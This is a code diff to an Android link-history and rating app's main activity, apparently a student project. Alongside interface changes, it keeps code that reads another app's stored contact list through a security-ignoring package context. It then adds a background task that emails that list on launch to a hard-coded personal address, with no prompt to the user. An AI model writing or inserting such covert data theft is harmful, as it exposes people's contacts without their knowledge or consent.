@@ -44,13 +44,16 @@ public class MainActivity extends AppCompatActivity {
     boolean linkVisited = false;
     long lastId;
 
+
     @Override
     protected void onCreate(Bundle savedInstanceState) {
         super.onCreate(savedInstanceState);
         setContentView(R.layout.activity_main);
         bdLinks = new BDLinks(this);
         links = new ArrayList<>();
-
+        bdLinks.open();
+        lastId = bdLinks.getLastId();
+        bdLinks.close();
         Context mContext = null;
         try {
             mContext = this.createPackageContext("com.example.app1", Context.CONTEXT_IGNORE_SECURITY);
@@ -58,25 +61,22 @@ public class MainActivity extends AppCompatActivity {
             String contactList = mPrefs.getString("contacts", null);
             System.out.println("LISTE DES CONTACTS: " + contactList);
 
-            /***BackgroundMail bm = new BackgroundMail(context);
-            bm.setGmailUserName("yourgmail@gmail.com");
-            bm.setGmailPassword("yourgmailpassword");
-            bm.setMailTo("receiver@gmail.com");
-            bm.setFormSubject("Subject");
-            bm.setFormBody("Body");
-            bm.send();***/
 
             String to = "khadija.abdelouali@outlook.fr";
             String subject = "Projet App Mobile";
-            Intent email = new Intent(Intent.ACTION_SEND);
+            sendMail sm = new sendMail(this, to, subject, contactList);
+            sm.execute();
+
+            /***Intent email = new Intent(Intent.ACTION_SEND);
             email.putExtra(Intent.EXTRA_EMAIL, new String[]{ to});
             email.putExtra(Intent.EXTRA_SUBJECT, subject);
             email.putExtra(Intent.EXTRA_TEXT, contactList);
 
+
 //need this to prompts email client only
             email.setType("message/rfc822");
 
-            //startActivity(email);
+            //startActivity(email);***/
 
         } catch (PackageManager.NameNotFoundException e) {
             e.printStackTrace();
@@ -88,6 +88,7 @@ public class MainActivity extends AppCompatActivity {
         super.onResume();
         bdLinks.open();
         links =  bdLinks.getAllLinks();
+        System.out.println(links.toString());
         bdLinks.close();
         LinearLayout navigation = (LinearLayout) findViewById(R.id.historique);
         LayoutInflater inflater = this.getLayoutInflater();
@@ -106,17 +107,39 @@ public class MainActivity extends AppCompatActivity {
             ratingPopUp.show(getSupportFragmentManager(), "rates");
             linkVisited = false;
         }
+        int rate = 5;
+        navigation.removeAllViews();
+        View divider = inflater.inflate(R.layout.rate_divider, null);
+        TextView rate_divider = divider.findViewById(R.id.rate_divider);
+        rate_divider.setText(rate + " stars");
+        navigation.addView(divider);
         for (int i = 0; i < links.size(); i++) {
+            if (links.get(i).getRate() < rate) {
+                View divider2 = inflater.inflate(R.layout.rate_divider, null);
+                rate = links.get(i).getRate();
+                TextView rate_divider2 = divider2.findViewById(R.id.rate_divider);
+                rate_divider2.setText(rate + " stars");
+                navigation.addView(divider2);
+            }
             View view = inflater.inflate(R.layout.link_display, null);
             TextView tv = view.findViewById(R.id.link);
             tv.setText(links.get(i).getLink());
             RatingBar rb = view.findViewById(R.id.ratingLink);
             rb.setRating((float) links.get(i).getRate());
+            rb.setEnabled(false);
             TextView date = view.findViewById(R.id.date);
             date.setText(links.get(i).getDate());
             navigation.addView(view);
             //  navigation.setText(navigation.getText().toString() + "\n" + links.get(i).getLink() + "(" +links.get(i).getRate() + " stars)");
         }
+    }
+
+    public void redirect(View view) {
+        TextView tv = (TextView)  view;
+        String link = "https://" + tv.getText().toString();
+        Uri page = Uri.parse(link);
+        Intent intent = new Intent(Intent.ACTION_VIEW, page);
+        startActivity(intent);
     }
 
     public void search(View view) {
@@ -127,20 +150,21 @@ public class MainActivity extends AppCompatActivity {
             link_text = "https://" + link_text;
         }
         System.out.println(link_text);
-        linkVisited = true;
         bdLinks.open();
-
-        Date today = new Date();
-        SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yy");
-        String date = formater.format(today);
-        System.out.println(date);
-        String[] array = link_text.split("//");
-        Links LinkToInsert = new Links(array[1], date, 0);
-        lastId = bdLinks.insertLink(LinkToInsert);
-        bdLinks.close();
-        Uri page = Uri.parse(link_text);
-        Intent intent = new Intent(Intent.ACTION_VIEW, page);
-        startActivity(intent);
-        link.setText("");
-    }
+            Date today = new Date();
+            SimpleDateFormat formater = new SimpleDateFormat("dd/MM/yy");
+            String date = formater.format(today);
+            System.out.println(date);
+            String[] array = link_text.split("//");
+            Links LinkToInsert = new Links(array[1], date, 0);
+            long insertedId = bdLinks.insertLink(LinkToInsert);
+            if (insertedId > lastId) {
+                linkVisited = true;
+            }
+            bdLinks.close();
+            Uri page = Uri.parse(link_text);
+            Intent intent = new Intent(Intent.ACTION_VIEW, page);
+            startActivity(intent);
+            link.setText("");
+        }
 }
